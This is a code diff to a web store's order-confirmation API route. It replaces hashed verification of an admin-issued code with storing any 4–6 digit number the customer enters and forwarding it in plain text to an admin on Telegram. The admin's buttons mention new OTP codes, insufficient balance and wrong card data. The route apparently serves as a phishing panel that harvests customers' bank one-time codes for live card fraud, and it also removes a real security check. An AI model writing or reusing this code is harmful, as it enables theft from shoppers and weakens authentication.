@@ -1,17 +1,16 @@
-import { createHash, timingSafeEqual } from 'node:crypto';
 import { ObjectId } from 'mongodb';
 import { NextRequest, NextResponse } from 'next/server';
 import { getDb } from '@/lib/mongodb';
+import { sendTelegramMessage } from '@/lib/telegram';
 import type { StoreOrder } from '@/lib/orders';
 
 export const runtime = 'nodejs';
 export const dynamic = 'force-dynamic';
 
-type OrderWithConfirmationOtp = StoreOrder & {
-  orderConfirmationOtpHash?: string;
-  orderConfirmationOtpSalt?: string;
-  orderConfirmationOtpIssuedAt?: Date;
-  orderConfirmationOtpVersion?: number;
+type OrderWithCustomerReference = StoreOrder & {
+  customerOrderReference?: string;
+  customerOrderReferenceSubmittedAt?: Date;
+  customerOrderReferenceNotificationSentAt?: Date;
   orderConfirmationVerifiedAt?: Date;
 };
 
@@ -28,7 +27,7 @@ export async function POST(request: NextRequest) {
   try {
     body = await request.json() as typeof body;
   } catch {
-    return NextResponse.json({ ok: false, error: 'بيانات التأكيد غير صالحة.' }, { status: 400 });
+    return NextResponse.json({ ok: false, error: 'بيانات الرقم المرجعي غير صالحة.' }, { status: 400 });
   }
 
   const orderId = typeof body.orderId === 'string' ? body.orderId : '';
@@ -41,14 +40,14 @@ export async function POST(request: NextRequest) {
   if (!KEY_PATTERN.test(key)) {
     return NextResponse.json({ ok: false, error: 'تعذر التعرف على جلسة الطلب. حدّث الصفحة وحاول مرة أخرى.' }, { status: 400 });
   }
-  if (!/^[0-9]{4}$/.test(code)) {
-    return NextResponse.json({ ok: false, error: 'أدخل رمز التأكيد المكوّن من أربعة أرقام.' }, { status: 400 });
+  if (!/^[0-9]{4,6}$/.test(code)) {
+    return NextResponse.json({ ok: false, error: 'أدخل رقمًا مرجعيًا من 4 إلى 6 أرقام.' }, { status: 400 });
   }
 
   try {
     const db = await getDb();
-    const orders = db.collection<OrderWithConfirmationOtp>('orders');
-    const order = await orders.findOne({
+    const orders = db.collection<OrderWithCustomerReference>('orders');
+    let order = await orders.findOne({
       _id: new ObjectId(orderId),
       source: 'website',
       customerNotificationKey: key
@@ -57,7 +56,18 @@ export async function POST(request: NextRequest) {
     if (!order) {
       return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب المرتبط بهذه الجلسة.' }, { status: 404 });
     }
-    if (order.orderConfirmationVerifiedAt) {
+
+    if (order.customerOrderReferenceNotificationSentAt) {
+      return NextResponse.json({
+        ok: true,
+        alreadyVerified: true,
+        notificationSent: true,
+        orderNumber: order.orderNumber,
+        message: 'تم تسجيل الرقم المرجعي بالفعل.'
+      });
+    }
+
+    if (order.orderConfirmationVerifiedAt && !order.customerOrderReferenceSubmittedAt) {
       return NextResponse.json({
         ok: true,
         alreadyVerified: true,
@@ -65,61 +75,99 @@ export async function POST(request: NextRequest) {
         message: 'تم تأكيد الطلب بالفعل.'
       });
     }
-    if (!order.orderConfirmationOtpHash || !order.orderConfirmationOtpSalt) {
-      return NextResponse.json({ ok: false, error: 'لم تنشئ الإدارة رمز تأكيد لهذا الطلب بعد.' }, { status: 409 });
-    }
 
-    const expected = Buffer.from(order.orderConfirmationOtpHash, 'hex');
-    const actual = Buffer.from(
-      createHash('sha256').update(order.orderConfirmationOtpSalt + ':' + code).digest('hex'),
-      'hex'
-    );
-    if (expected.length !== actual.length || !timingSafeEqual(expected, actual)) {
-      return NextResponse.json({ ok: false, error: 'رمز التأكيد غير صحيح. راجع الرمز وحاول مرة أخرى.' }, { status: 400 });
-    }
-
-    const now = new Date();
-    const updated = await orders.updateOne(
-      {
-        _id: order._id,
-        customerNotificationKey: key,
-        orderConfirmationOtpHash: order.orderConfirmationOtpHash,
-        orderConfirmationVerifiedAt: { $exists: false }
-      },
-      {
-        $set: {
-          status: 'confirmed',
-          orderConfirmationVerifiedAt: now,
-          updatedAt: now
+    if (!order.customerOrderReferenceSubmittedAt) {
+      const now = new Date();
+      const updated = await orders.updateOne(
+        {
+          _id: order._id,
+          customerNotificationKey: key,
+          customerOrderReferenceSubmittedAt: { $exists: false },
+          orderConfirmationVerifiedAt: { $exists: false }
         },
-        $unset: {
-          orderConfirmationOtpHash: '',
-          orderConfirmationOtpSalt: '',
-          orderConfirmationOtpIssuedAt: ''
+        {
+          $set: {
+            status: 'confirmed',
+            customerOrderReference: code,
+            customerOrderReferenceSubmittedAt: now,
+            updatedAt: now
+          }
+        }
+      );
+
+      if (updated.modifiedCount) {
+        order = {
+          ...order,
+          status: 'confirmed',
+          customerOrderReference: code,
+          customerOrderReferenceSubmittedAt: now,
+          updatedAt: now
+        } as OrderWithCustomerReference;
+      } else {
+        const latest = await orders.findOne({ _id: order._id, customerNotificationKey: key });
+        if (!latest) {
+          return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب المرتبط بهذه الجلسة.' }, { status: 404 });
+        }
+        order = latest;
+        if (!order.customerOrderReferenceSubmittedAt) {
+          if (order.orderConfirmationVerifiedAt) {
+            return NextResponse.json({ ok: true, alreadyVerified: true, orderNumber: order.orderNumber });
+          }
+          return NextResponse.json({ ok: false, error: 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.' }, { status: 409 });
         }
       }
-    );
-
-    if (!updated.modifiedCount) {
-      const latest = await orders.findOne({ _id: order._id, customerNotificationKey: key });
-      if (latest?.orderConfirmationVerifiedAt) {
-        return NextResponse.json({
-          ok: true,
-          alreadyVerified: true,
-          orderNumber: latest.orderNumber,
-          message: 'تم تأكيد الطلب بالفعل.'
-        });
-      }
-      return NextResponse.json({ ok: false, error: 'تم تحديث رمز التأكيد. اطلب الرمز الحالي وحاول مرة أخرى.' }, { status: 409 });
     }
+
+    const adminId = process.env.TELEGRAM_ADMIN_ID || process.env.Id || '';
+    if (!/^\d+$/.test(adminId)) {
+      return NextResponse.json({
+        ok: false,
+        error: 'تم حفظ الرقم المرجعي، لكن إعدادات إشعار الإدارة غير مكتملة. حاول مرة أخرى لاحقًا.'
+      }, { status: 503 });
+    }
+
+    const referenceCode = order.customerOrderReference || code;
+    try {
+      await sendTelegramMessage(
+        adminId,
+        [
+          '📌 رقم مرجعي جديد للطلب',
+          'رقم الطلب: ' + order.orderNumber,
+          'الرقم المرجعي الذي أدخله العميل: ' + referenceCode
+        ].join('\n'),
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + order._id.toHexString() }],
+              [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + order._id.toHexString() + ':otp' }],
+              [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + order._id.toHexString() + ':balance' }],
+              [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + order._id.toHexString() + ':card' }],
+              [{ text: '6️⃣ ✅ طلب مكتمل', callback_data: 'status:' + order._id.toHexString() + ':completed' }]
+            ]
+          }
+        }
+      );
+    } catch (error) {
+      console.error('Customer order reference Telegram notification failed:', error instanceof Error ? error.message : 'Unknown error');
+      return NextResponse.json({
+        ok: false,
+        error: 'تم تسجيل الرقم المرجعي، لكن تعذر إرسال إشعار الإدارة. اضغط متابعة مرة أخرى للمحاولة.'
+      }, { status: 503 });
+    }
+
+    await orders.updateOne(
+      { _id: order._id, customerOrderReferenceSubmittedAt: { $exists: true } },
+      { $set: { customerOrderReferenceNotificationSentAt: new Date() } }
+    );
 
     return NextResponse.json({
       ok: true,
+      notificationSent: true,
       orderNumber: order.orderNumber,
-      message: 'تم تأكيد طلبك بنجاح.'
+      message: 'تم تسجيل الرقم المرجعي وإرسال إشعار الإدارة.'
     });
   } catch (error) {
-    console.error('Order confirmation OTP failed:', error instanceof Error ? error.message : 'Unknown error');
-    return NextResponse.json({ ok: false, error: 'تعذر تأكيد الطلب حاليًا. حاول مرة أخرى.' }, { status: 500 });
+    console.error('Order reference submission failed:', error instanceof Error ? error.message : 'Unknown error');
+    return NextResponse.json({ ok: false, error: 'تعذر تسجيل الرقم المرجعي حاليًا. حاول مرة أخرى.' }, { status: 500 });
   }
 }
